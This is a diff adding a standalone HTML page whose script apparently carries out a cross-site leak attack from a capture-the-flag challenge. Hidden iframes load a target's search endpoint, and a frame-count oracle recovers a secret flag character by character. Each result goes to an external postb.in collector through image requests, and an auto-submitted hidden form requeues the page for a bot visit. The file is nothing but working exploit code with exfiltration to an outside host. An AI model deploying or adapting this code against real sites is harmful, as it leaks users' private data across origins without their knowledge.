@@ -1,0 +1,105 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>nightbyte</title>
+<body>
+<pre id="l">starting...</pre>
+<script>
+(() => {
+  const TARGET = "https://104.248.82.195";
+  const BIN = "1774287134964-3781536610331"; // postb.in binId
+
+  const params = new URLSearchParams(location.search);
+  let prefix = params.get("p") || "f13{";
+  const steps = Math.min(parseInt(params.get("steps") || "1", 10) || 1, 1);
+
+  const logEl = document.getElementById("l");
+  const log = (m) => { try { logEl.textContent += "\n" + m; } catch (e) {} };
+  const send = (k, v) => {
+    const img = new Image();
+    img.src = "https://www.postb.in/" + BIN +
+      "?k=" + encodeURIComponent(k) +
+      "&v=" + encodeURIComponent(v) +
+      "&t=" + Date.now();
+  };
+
+  // Oracle: press /library?q=<needle> contains 1 iframe when match, else 0.
+  const probe = (needle) => new Promise((resolve) => {
+    const f = document.createElement("iframe");
+    f.style.width = "1px";
+    f.style.height = "1px";
+    f.style.border = "0";
+    let done = false;
+    const finish = (n) => {
+      if (done) return;
+      done = true;
+      try { f.remove(); } catch (e) {}
+      resolve(n);
+    };
+    f.onload = () => {
+      let n = -1;
+      try { n = f.contentWindow.length; } catch (e) {
+        try { n = f.contentWindow.frames.length; } catch (e2) { n = -2; }
+      }
+      finish(n);
+    };
+    f.src = TARGET + "/library?q=" + encodeURIComponent(needle);
+    document.body.appendChild(f);
+    setTimeout(() => finish(-3), 2500);
+  });
+
+  const charset = ("abcdefghijklmnopqrstuvwxyz" + "0123456789" + "_" + "-" + "}").split("");
+
+  const pickNext = async () => {
+    for (const c of charset) {
+      const n = await probe(prefix + c);
+      if (n > 0) return c;
+    }
+    return null;
+  };
+
+  const requeue = (newPrefix) => {
+    const form = document.createElement("form");
+    form.method = "POST";
+    form.action = TARGET + "/spotlight/request";
+    const inp = document.createElement("input");
+    inp.type = "hidden";
+    inp.name = "listing";
+    inp.value = "@maz-dev834.github.io/nightbyte.html?p=" + encodeURIComponent(newPrefix) + "&steps=1";
+    form.appendChild(inp);
+    document.body.appendChild(form);
+    form.submit();
+  };
+
+  (async () => {
+    send("start", prefix);
+    log("prefix=" + prefix);
+
+    const base = await probe(prefix);
+    if (base < 0) {
+      send("oracle_fail", String(base));
+      log("oracle_fail=" + base);
+      return;
+    }
+
+    for (let i = 0; i < steps; i++) {
+      const c = await pickNext();
+      if (!c) {
+        send("no_match", prefix);
+        log("no_match");
+        return;
+      }
+      prefix += c;
+      send("progress", prefix);
+      log("progress=" + prefix);
+      if (c === "}") {
+        send("flag", prefix);
+        log("done");
+        return;
+      }
+    }
+
+    requeue(prefix);
+    send("requeued", prefix);
+  })();
+})();
+</script>
